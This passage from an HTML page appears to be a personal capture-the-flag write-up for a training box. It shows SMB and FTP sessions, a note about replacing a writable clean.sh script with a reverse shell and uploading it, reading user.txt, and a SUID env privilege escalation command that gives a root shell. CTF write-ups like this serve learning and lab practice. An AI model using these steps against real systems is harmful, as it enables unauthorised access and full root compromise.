+<span class="nv">smb</span>:<span class="w"> </span>\<span class="o">&gt;</span><span class="w"> </span><span class="nv">get</span><span class="w"> </span><span class="nv">puppos</span>.<span class="nv">jpeg</span>
+<span class="nv">getting</span><span class="w"> </span><span class="nv">file</span><span class="w"> </span>\<span class="nv">puppos</span>.<span class="nv">jpeg</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">size</span><span class="w"> </span><span class="mi">265188</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">puppos</span>.<span class="nv">jpeg</span><span class="w"> </span><span class="ss">(</span><span class="mi">57</span>.<span class="mi">6</span><span class="w"> </span><span class="nv">KiloBytes</span><span class="o">/</span><span class="nv">sec</span><span class="ss">)</span><span class="w"> </span><span class="ss">(</span><span class="nv">average</span><span class="w"> </span><span class="mi">41</span>.<span class="mi">2</span><span class="w"> </span><span class="nv">KiloBytes</span><span class="o">/</span><span class="nv">sec</span><span class="ss">)</span>
+<span class="nv">smb</span>:<span class="w"> </span>\<span class="o">&gt;</span><span class="w"> </span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>ftp&gt; cd scripts
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||10796|)
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000         3741 Oct 12 20:09 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+226 Directory send OK.
+ftp&gt; get clean.sh
+local: clean.sh remote: clean.sh
+229 Entering Extended Passive Mode (|||9328|)
+150 Opening BINARY mode data connection for clean.sh (314 bytes).
+100% |**************************************************************************************************************|   314        5.54 MiB/s    00:00 ETA
+226 Transfer complete.
+314 bytes received in 00:00 (0.61 KiB/s)
+ftp&gt; get removed_files.log
+local: removed_files.log remote: removed_files.log
+229 Entering Extended Passive Mode (|||32644|)
+150 Opening BINARY mode data connection for removed_files.log (3741 bytes).
+100% |**************************************************************************************************************|  3741        2.76 MiB/s    00:00 ETA
+226 Transfer complete.
+3741 bytes received in 00:00 (5.63 KiB/s)
+ftp&gt; get to_do.txt
+local: to_do.txt remote: to_do.txt
+229 Entering Extended Passive Mode (|||24035|)
+150 Opening BINARY mode data connection for to_do.txt (68 bytes).
+100% |**************************************************************************************************************|    68        6.99 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (0.19 KiB/s)
+ftp&gt; 
+</code></pre></div>
+
+<blockquote>
+<p>modify clean.sh to putting reverse shell and upload and get reverse shell</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>ftp&gt; put clean.sh clean.sh
+local: clean.sh remote: clean.sh
+229 Entering Extended Passive Mode (|||15273|)
+150 Ok to send data.
+100% |**************************************************************************************************************|    55      671.38 KiB/s    00:00 ETA
+226 Transfer complete.
+55 bytes sent in 00:00 (0.06 KiB/s)
+ftp&gt; 
+</code></pre></div>
+
+<blockquote>
+<p>get user.txt</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="n">namelessone</span><span class="nv">@anonymous</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">ls</span>
+<span class="n">pics</span><span class="w">  </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">namelessone</span><span class="nv">@anonymous</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+
+<blockquote>
+<p>use linpeas found suid case for env</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="n">namelessone</span><span class="nv">@anonymous</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
+
+<span class="err">#</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
